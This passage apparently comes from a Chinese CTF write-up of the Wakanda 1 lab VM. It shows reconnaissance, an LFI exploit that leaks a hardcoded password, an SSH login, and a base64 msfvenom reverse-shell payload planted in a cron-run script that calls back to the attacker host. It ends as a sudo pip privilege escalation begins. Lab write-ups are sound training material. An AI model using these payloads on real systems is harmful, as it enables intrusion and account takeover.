&lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000</span><br><span class="line">    link/ether 0a:00:27:00:00:00 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.56.1/24 brd 192.168.56.255 scope global vboxnet0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::800:27ff:fe00:0/64 scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">➜  ~ nmap -sn 192.168.56.1/24</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-16 20:00 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.1</span><br><span class="line">Host is up (0.0011s latency).</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.101</span><br><span class="line">Host is up (0.00057s latency).</span><br><span class="line">Nmap <span class="keyword">done</span>: 256 IP addresses (2 hosts up) scanned <span class="keyword">in</span> 2.77 seconds</span><br></pre></td></tr></table></figure><ul><li>IP是192.168.56.101，除了开放了RPC服务和以前的没什么太大的变化。从Web入手。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ nmap -T4 -A 192.168.56.101</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-16 20:01 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.101</span><br><span class="line">Host is up (0.0023s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.10 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.10 (Debian)</span><br><span class="line">|_http-title: Vibranium Market</span><br><span class="line">111/tcp  open  rpcbind 2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version   port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp  rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp  rpcbind</span><br><span class="line">|   100024  1          40326/tcp  status</span><br><span class="line">|_  100024  1          54014/udp  status</span><br><span class="line">3333/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 1c:98:47:56:<span class="built_in">fc</span>:b8:14:08:8f:93:ca:36:44:7f:ea:7a (DSA)</span><br><span class="line">|   2048 f1:d5:04:78:d3:3a:9b:dc:13:df:0f:5f:7f:fb:f4:26 (RSA)</span><br><span class="line">|   256 d8:34:41:5d:9b:fe:51:bc:c6:4e:02:14:5e:e1:08:c5 (ECDSA)</span><br><span class="line">|_  256 0e:f5:8d:29:3c:73:57:c7:38:08:6d:50:84:b6:6c:27 (ED25519)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 7.34 seconds</span><br></pre></td></tr></table></figure><ul><li>主页是一个单页，扫一顿也没发现什么。但是F12发现了<code>&lt;!-- &lt;a class=&quot;nav-link active&quot; href=&quot;?lang=fr&quot;&gt;Fr/a&gt; --&gt;</code>，访问<code>http://192.168.56.101/?lang=fr</code>时主页多了一写东西。猜想这是切换语言是要包含本地文件，所以就试了试。发现存在LFI漏洞。和以前的<a href="https://kali-team.cn/2018/07/10/Write-up-pwnlab-init/" target="_blank" rel="noopener">pwnlab_init</a>套路一样。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ nikto -h http://192.168.56.101</span><br><span class="line">- Nikto v2.1.6</span><br><span class="line"><span class="comment">---------------------------------------------------------------------------</span></span><br><span class="line">+ Target IP:          192.168.56.101</span><br><span class="line">+ Target Hostname:    192.168.56.101</span><br><span class="line">+ Target Port:        80</span><br><span class="line">+ <span class="keyword">Start</span> <span class="built_in">Time</span>:         <span class="number">2018</span><span class="number">-10</span><span class="number">-16</span> <span class="number">20</span>:<span class="number">06</span>:<span class="number">38</span> (GMT8)</span><br><span class="line"><span class="comment">---------------------------------------------------------------------------</span></span><br><span class="line">+ <span class="keyword">Server</span>: Apache/<span class="number">2.4</span><span class="number">.10</span> (Debian)</span><br><span class="line">+ The <span class="keyword">anti</span>-clickjacking X-Frame-Options header <span class="keyword">is</span> <span class="keyword">not</span> present.</span><br><span class="line">+ The X-XSS-<span class="keyword">Protection</span> header <span class="keyword">is</span> <span class="keyword">not</span> defined. This header can hint <span class="keyword">to</span> the <span class="keyword">user</span> <span class="keyword">agent</span> <span class="keyword">to</span> protect against <span class="keyword">some</span> forms <span class="keyword">of</span> XSS</span><br><span class="line">+ The X-<span class="keyword">Content</span>-<span class="keyword">Type</span>-Options header <span class="keyword">is</span> <span class="keyword">not</span> set. This could <span class="keyword">allow</span> the <span class="keyword">user</span> <span class="keyword">agent</span> <span class="keyword">to</span> render the <span class="keyword">content</span> <span class="keyword">of</span> the site <span class="keyword">in</span> a different fashion <span class="keyword">to</span> the MIME <span class="keyword">type</span></span><br><span class="line">+ <span class="keyword">No</span> CGI Directories <span class="keyword">found</span> (<span class="keyword">use</span> <span class="string">'-C all'</span> <span class="keyword">to</span> <span class="keyword">force</span> <span class="keyword">check</span> <span class="keyword">all</span> possible dirs)</span><br><span class="line">+ Apache/<span class="number">2.4</span><span class="number">.10</span> appears <span class="keyword">to</span> be outdated (<span class="keyword">current</span> <span class="keyword">is</span> <span class="keyword">at</span> <span class="keyword">least</span> Apache/<span class="number">2.4</span><span class="number">.12</span>). Apache <span class="number">2.0</span><span class="number">.65</span> (<span class="keyword">final</span> <span class="keyword">release</span>) <span class="keyword">and</span> <span class="number">2.2</span><span class="number">.29</span> <span class="keyword">are</span> also current.</span><br><span class="line">+ Web <span class="keyword">Server</span> <span class="keyword">returns</span> a valid response <span class="keyword">with</span> junk <span class="keyword">HTTP</span> methods, this may cause <span class="literal">false</span> positives.</span><br><span class="line">+ <span class="keyword">Server</span> leaks inodes via ETags, header <span class="keyword">found</span> <span class="keyword">with</span> <span class="keyword">file</span> /icons/README, <span class="keyword">fields</span>: <span class="number">0x13f4</span> <span class="number">0x438c034968a80</span> </span><br><span class="line">+ OSVDB<span class="number">-3233</span>: /icons/README: Apache <span class="keyword">default</span> <span class="keyword">file</span> found.</span><br><span class="line">+ <span class="number">7535</span> requests: <span class="number">0</span> <span class="keyword">error</span>(s) <span class="keyword">and</span> <span class="number">7</span> item(s) reported <span class="keyword">on</span> remote host</span><br><span class="line">+ <span class="keyword">End</span> <span class="built_in">Time</span>:           <span class="number">2018</span><span class="number">-10</span><span class="number">-16</span> <span class="number">20</span>:<span class="number">06</span>:<span class="number">57</span> (GMT8) (<span class="number">19</span> <span class="keyword">seconds</span>)</span><br><span class="line"><span class="comment">---------------------------------------------------------------------------</span></span><br><span class="line">+ <span class="number">1</span> host(s) tested</span><br><span class="line">➜  ~ dirb <span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.56</span><span class="number">.101</span>/</span><br><span class="line"></span><br><span class="line"><span class="comment">-----------------</span></span><br><span class="line">DIRB v2<span class="number">.22</span>    </span><br><span class="line"><span class="keyword">By</span> The Dark Raver</span><br><span class="line"><span class="comment">-----------------</span></span><br><span class="line"></span><br><span class="line">START_TIME: Tue <span class="keyword">Oct</span> <span class="number">16</span> <span class="number">20</span>:<span class="number">07</span>:<span class="number">03</span> <span class="number">2018</span></span><br><span class="line">URL_BASE: <span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.56</span><span class="number">.101</span>/</span><br><span class="line">WORDLIST_FILES: /usr/<span class="keyword">share</span>/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">-----------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">GENERATED</span> WORDS: <span class="number">4612</span>                                                          </span><br><span class="line"></span><br><span class="line"><span class="comment">---- Scanning URL: http://192.168.56.101/ ----</span></span><br><span class="line">+ <span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.56</span><span class="number">.101</span>/<span class="keyword">admin</span> (CODE:<span class="number">200</span>|<span class="keyword">SIZE</span>:<span class="number">0</span>)                                       </span><br><span class="line">+ <span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.56</span><span class="number">.101</span>/<span class="keyword">backup</span> (CODE:<span class="number">200</span>|<span class="keyword">SIZE</span>:<span class="number">0</span>)                                     </span><br><span class="line">+ <span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.56</span><span class="number">.101</span>/index.php (CODE:<span class="number">200</span>|<span class="keyword">SIZE</span>:<span class="number">1527</span>)                               </span><br><span class="line">+ <span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.56</span><span class="number">.101</span>/secret (CODE:<span class="number">200</span>|<span class="keyword">SIZE</span>:<span class="number">0</span>)                                     </span><br><span class="line">+ <span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.56</span><span class="number">.101</span>/<span class="keyword">server</span>-<span class="keyword">status</span> (CODE:<span class="number">403</span>|<span class="keyword">SIZE</span>:<span class="number">302</span>)                             </span><br><span class="line">+ <span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.56</span><span class="number">.101</span>/shell (CODE:<span class="number">200</span>|<span class="keyword">SIZE</span>:<span class="number">0</span>)                                       </span><br><span class="line"><span class="comment">-----------------</span></span><br><span class="line">END_TIME: Tue <span class="keyword">Oct</span> <span class="number">16</span> <span class="number">20</span>:<span class="number">07</span>:<span class="number">05</span> <span class="number">2018</span></span><br><span class="line">DOWNLOADED: <span class="number">4612</span> - <span class="keyword">FOUND</span>: <span class="number">6</span></span><br><span class="line">➜  ~</span><br></pre></td></tr></table></figure><h3 id="利用LFI漏洞"><a href="#利用LFI漏洞" class="headerlink" title="利用LFI漏洞"></a>利用LFI漏洞</h3><ul><li>利用<code>php://filter/convert.base64-encode/resource</code>获取inde页面的源码再base64解码。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜ ～ curl <span class="string">"http://192.168.56.101/?lang=php://filter/convert.base64-encode/resource=index"</span></span><br><span class="line">PD9waHAKJHBhc3N3b3JkID0iTmlhbWV5NEV2ZXIyMjchISEiIDsvL0kgaGF2ZSB0byByZW1lbWJlciBpdAoKaWYgKGlzc2V0KCRfR0VUWydsYW5nJ10pKQp7CmluY2x1ZGUoJF9HRVRbJ2xhbmcnXS4iLnBocCIpOwp9Cgo/PgoKCgo8IURPQ1RZUEUgaHRtbD4KPGh0bWwgbGFuZz0iZW4iPjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJjb250ZW50LXR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1VVEYtOCI+CiAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEsIHNocmluay10by1maXQ9bm8iPgogICAgPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9IlZpYnJhbml1bSBtYXJrZXQiPgogICAgPG1ldGEgbmFtZT0iYXV0aG9yIiBjb250ZW50PSJtYW1hZG91Ij4KCiAgICA8dGl0bGU+VmlicmFuaXVtIE1hcmtldDwvdGl0bGU+CgoKICAgIDxsaW5rIGhyZWY9ImJvb3RzdHJhcC5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CgogICAgCiAgICA8bGluayBocmVmPSJjb3Zlci5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CiAgPC9oZWFkPgoKICA8Ym9keSBjbGFzcz0idGV4dC1jZW50ZXIiPgoKICAgIDxkaXYgY2xhc3M9ImNvdmVyLWNvbnRhaW5lciBkLWZsZXggdy0xMDAgaC0xMDAgcC0zIG14LWF1dG8gZmxleC1jb2x1bW4iPgogICAgICA8aGVhZGVyIGNsYXNzPSJtYXN0aGVhZCBtYi1hdXRvIj4KICAgICAgICA8ZGl2IGNsYXNzPSJpbm5lciI+CiAgICAgICAgICA8aDMgY2xhc3M9Im1hc3RoZWFkLWJyYW5kIj5WaWJyYW5pdW0gTWFya2V0PC9oMz4KICAgICAgICAgIDxuYXYgY2xhc3M9Im5hdiBuYXYtbWFzdGhlYWQganVzdGlmeS1jb250ZW50LWNlbnRlciI+CiAgICAgICAgICAgIDxhIGNsYXNzPSJuYXYtbGluayBhY3RpdmUiIGhyZWY9IiMiPkhvbWU8L2E+CiAgICAgICAgICAgIDwhLS0gPGEgY2xhc3M9Im5hdi1saW5rIGFjdGl2ZSIgaHJlZj0iP2xhbmc9ZnIiPkZyL2E+IC0tPgogICAgICAgICAgPC9uYXY+CiAgICAgICAgPC9kaXY+CiAgICAgIDwvaGVhZGVyPgoKICAgICAgPG1haW4gcm9sZT0ibWFpbiIgY2xhc3M9ImlubmVyIGNvdmVyIj4KICAgICAgICA8aDEgY2xhc3M9ImNvdmVyLWhlYWRpbmciPkNvbWluZyBzb29uPC9oMT4KICAgICAgICA8cCBjbGFzcz0ibGVhZCI+CiAgICAgICAgICA8P3BocAogICAgICAgICAgICBpZiAoaXNzZXQoJF9HRVRbJ2xhbmcnXSkpCiAgICAgICAgICB7CiAgICAgICAgICBlY2hvICRtZXNzYWdlOwogICAgICAgICAgfQogICAgICAgICAgZWxzZQogICAgICAgICAgewogICAgICAgICAgICA/PgoKICAgICAgICAgICAgTmV4dCBvcGVuaW5nIG9mIHRoZSBsYXJnZXN0IHZpYnJhbml1bSBtYXJrZXQuIFRoZSBwcm9kdWN0cyBjb21lIGRpcmVjdGx5IGZyb20gdGhlIHdha2FuZGEuIHN0YXkgdHVuZWQhCiAgICAgICAgICAgIDw/cGhwCiAgICAgICAgICB9Cj8+CiAgICAgICAgPC9wPgogICAgICAgIDxwIGNsYXNzPSJsZWFkIj4KICAgICAgICAgIDxhIGhyZWY9IiMiIGNsYXNzPSJidG4gYnRuLWxnIGJ0bi1zZWNvbmRhcnkiPkxlYXJuIG1vcmU8L2E+CiAgICAgICAgPC9wPgogICAgICA8L21haW4+CgogICAgICA8Zm9vdGVyIGNsYXNzPSJtYXN0Zm9vdCBtdC1hdXRvIj4KICAgICAgICA8ZGl2IGNsYXNzPSJpbm5lciI+CiAgICAgICAgICA8cD5NYWRlIGJ5PGEgaHJlZj0iIyI+QG1hbWFkb3U8L2E+PC9wPgogICAgICAgIDwvZGl2PgogICAgICA8L2Zvb3Rlcj4KICAgIDwvZGl2PgoKCgogIAoKPC9ib2R5PjwvaHRtbD4=</span><br></pre></td></tr></table></figure><h3 id="登录SSH"><a href="#登录SSH" class="headerlink" title="登录SSH"></a>登录SSH</h3><ul><li>在源码里找到了<code>$password =&quot;Niamey4Ever227!!!&quot; ;//I have to remember it</code>，密码找到了，有在主页里找到了<code>Made by[@mamadou](http://192.168.56.101/#)</code>所以用户名是mamadou。登录ssh。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ ssh mamadou@192.168.56.101 -p 3333</span><br><span class="line">The authenticity of host <span class="string">'[192.168.56.101]:3333 ([192.168.56.101]:3333)'</span> can<span class="string">'t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:X+fXjgH34Ta5l6I4kUSpiVZNBGGBGtjxZxgyU7KCFwk.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no)? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added '</span>[192.168.56.101]:3333<span class="string">' (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">mamadou@192.168.56.101'</span>s password: </span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Fri Aug  3 15:53:29 2018 from 192.168.56.1</span><br><span class="line">Python 2.7.9 (default, Jun 29 2016, 13:08:31) </span><br><span class="line">[GCC 4.9.2] on linux2</span><br><span class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> or <span class="string">"license"</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><ul><li>但是发现这并不是系统的bash shell而是一个Python的交互命令行。这好办，都不用我输入<code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code>，第一个Flag到手。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Python 2.7.9 (default, Jun 29 2016, 13:08:31) </span><br><span class="line">[GCC 4.9.2] on linux2</span><br><span class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> or <span class="string">"license"</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; import pty</span><br><span class="line">&gt;&gt;&gt; pty.spawn(<span class="string">"/bin/bash"</span>)</span><br><span class="line">mamadou@Wakanda1:~$ id</span><br><span class="line">uid=1000(mamadou) gid=1000(mamadou) groups=1000(mamadou)</span><br><span class="line">mamadou@Wakanda1:~$ </span><br><span class="line">mamadou@Wakanda1:~$ ls</span><br><span class="line">flag1.txt</span><br><span class="line">mamadou@Wakanda1:~$ cat flag1.txt </span><br><span class="line"></span><br><span class="line">Flag : d86b9ad71ca887f4dd1dac86ba1c4dfc</span><br><span class="line">mamadou@Wakanda1:~$</span><br></pre></td></tr></table></figure><ul><li>在tmp目录发现一个devops用户的一个test文件。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mamadou@Wakanda1:/tmp$ ls -al</span><br><span class="line">total 32</span><br><span class="line">drwxrwxrwt  7 root   root      4096 Oct 16 08:28 .</span><br><span class="line">drwxr-xr-x 22 root   root      4096 Aug  1 13:05 ..</span><br><span class="line">drwxrwxrwt  2 root   root      4096 Oct 16 07:49 .font-unix</span><br><span class="line">drwxrwxrwt  2 root   root      4096 Oct 16 07:49 .ICE-unix</span><br><span class="line">-rw-r--r--  1 devops developer    4 Oct 16 08:24 <span class="built_in">test</span></span><br><span class="line">drwxrwxrwt  2 root   root      4096 Oct 16 07:49 .Test-unix</span><br><span class="line">drwxrwxrwt  2 root   root      4096 Oct 16 07:49 .X11-unix</span><br><span class="line">drwxrwxrwt  2 root   root      4096 Oct 16 07:49 .XIM-unix</span><br><span class="line">mamadou@Wakanda1:/tmp$</span><br></pre></td></tr></table></figure><ul><li>搜索所以属于devops的文件，发现了一个<code>.antivirus.py</code>文件，然后我又回去看了一下test文件，发现更新时间一直再变，那就有可能是上面的py是会隔一段时间就会执行的。</li></ul><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">mamadou@Wakanda1:/tmp$ find / -user devops 2&gt;/dev/null</span><br><span class="line">/srv/.antivirus.py</span><br><span class="line">/tmp/test</span><br><span class="line">/home/devops</span><br><span class="line">/home/devops/.bashrc</span><br><span class="line">/home/devops/.profile</span><br><span class="line">/home/devops/.bash_logout</span><br><span class="line">/home/devops/flag2.txt</span><br><span class="line">mamadou@Wakanda1:/tmp$ </span><br><span class="line"></span><br><span class="line">mamadou@Wakanda1:/srv$ cat .antivirus.py </span><br><span class="line">open('/tmp/test','w').write('test')</span><br><span class="line">mamadou@Wakanda1:/srv$ ls -la</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x <span class="number"> 2 </span>root   root     <span class="number"> 4096 </span>Aug <span class="number"> 1 </span>17:52 .</span><br><span class="line">drwxr-xr-x<span class="number"> 22 </span>root   root     <span class="number"> 4096 </span>Aug <span class="number"> 1 </span>13:05 ..</span><br><span class="line">-rw-r--rw- <span class="number"> 1 </span>devops developer  <span class="number"> 36 </span>Aug <span class="number"> 1 </span>20:08 .antivirus.py</span><br><span class="line">mamadou@Wakanda1:/srv$ </span><br><span class="line">mamadou@Wakanda1:/tmp$ ls -al</span><br><span class="line">total 32</span><br><span class="line">drwxrwxrwt <span class="number"> 7 </span>root   root     <span class="number"> 4096 </span>Oct<span class="number"> 16 </span>08:39 .</span><br><span class="line">drwxr-xr-x<span class="number"> 22 </span>root   root     <span class="number"> 4096 </span>Aug <span class="number"> 1 </span>13:05 ..</span><br><span class="line">drwxrwxrwt <span class="number"> 2 </span>root   root     <span class="number"> 4096 </span>Oct<span class="number"> 16 </span>07:49 .font-unix</span><br><span class="line">drwxrwxrwt <span class="number"> 2 </span>root   root     <span class="number"> 4096 </span>Oct<span class="number"> 16 </span>07:49 .ICE-unix</span><br><span class="line">-rw-r--r-- <span class="number"> 1 </span>devops developer   <span class="number"> 4 </span>Oct<span class="number"> 16 </span>08:39 test</span><br><span class="line">drwxrwxrwt <span class="number"> 2 </span>root   root     <span class="number"> 4096 </span>Oct<span class="number"> 16 </span>07:49 .Test-unix</span><br><span class="line">drwxrwxrwt <span class="number"> 2 </span>root   root     <span class="number"> 4096 </span>Oct<span class="number"> 16 </span>07:49 .X11-unix</span><br><span class="line">drwxrwxrwt <span class="number"> 2 </span>root   root     <span class="number"> 4096 </span>Oct<span class="number"> 16 </span>07:49 .XIM-unix</span><br></pre></td></tr></table></figure><ul><li>生成msf的Python反弹后门，把代码复制到<code>.antivirus.py</code>里打开msf监听7777端口坐等shell。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ msfvenom -p cmd/unix/reverse_python lhost=192.168.56.1 lport=7788 formats py R</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload</span><br><span class="line">[-] No arch selected, selecting arch: cmd from the payload</span><br><span class="line">No encoder or badchars specified, outputting raw payload</span><br><span class="line">Payload size: 537 bytes</span><br><span class="line">python -c <span class="string">"exec('aW1wb3J0IHNvY2tldCwgICAgICBzdWJwcm9jZXNzLCAgICAgIG9zICAgIDsgICAgICAgICBob3N0PSIxOTIuMTY4LjU2LjEiICAgIDsgICAgICAgICBwb3J0PTc3ODggICAgOyAgICAgICAgIHM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgICAgICBzb2NrZXQuU09DS19TVFJFQU0pICAgIDsgICAgICAgICBzLmNvbm5lY3QoKGhvc3QsICAgICAgcG9ydCkpICAgIDsgICAgICAgICBvcy5kdXAyKHMuZmlsZW5vKCksICAgICAgMCkgICAgOyAgICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSwgICAgICAxKSAgICA7ICAgICAgICAgb3MuZHVwMihzLmZpbGVubygpLCAgICAgIDIpICAgIDsgICAgICAgICBwPXN1YnByb2Nlc3MuY2FsbCgiL2Jpbi9iYXNoIik='.decode('base64'))"</span></span><br></pre></td></tr></table></figure><ul><li>经过漫长的等待，shell终于弹回来了。第二个Flag到手。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ nc -lvp 7788</span><br><span class="line">Connection from 192.168.56.101:50517</span><br><span class="line">id</span><br><span class="line">uid=1001(devops) gid=1002(developer) groups=1002(developer)</span><br><span class="line">python -c <span class="string">'import pty;pty.spawn("/bin/bash")'</span></span><br><span class="line">devops@Wakanda1:/$ <span class="built_in">cd</span> ~</span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">devops@Wakanda1:~$ ls</span><br><span class="line">ls</span><br><span class="line">flag2.txt</span><br><span class="line"></span><br><span class="line">devops@Wakanda1:~$ cat flag2.txt</span><br><span class="line">cat flag2.txt</span><br><span class="line">Flag 2 : d8ce56398c88e1b4d9e5f83e64c79098</span><br><span class="line">devops@Wakanda1:~$</span><br></pre></td></tr></table></figure><h3 id="FakePip提权"><a href="#FakePip提权" class="headerlink" title="FakePip提权"></a>FakePip提权</h3><ul><li>pip可以用sudo而且不用输入密码。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">devops@Wakanda1:~$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> devops on Wakanda1:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User devops may run the following commands on Wakanda1:</span><br><span class="line">    (ALL) NOPASSWD: /usr/bin/pip</span><br><span class="line">devops@Wakanda1:~$</span><br></pre></td></tr></table></figure><ul><li>项目地址：<a href="https://github.com/0x00-0x00/FakePip" target="_blank" rel="noopener">点我</a>，打开setup.py文件把里面的IP改了就可以了。项目里也有详细的教程。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">➜  FakePip git:(master) ✗ php -S 0.0.0.0:4444</span><br><span class="line">PHP 7.2.10 Development Server started at Tue Oct 16 21:40:47 2018</span><br><span class="line">Listening on http://0.0.0.0:4444</span><br><span 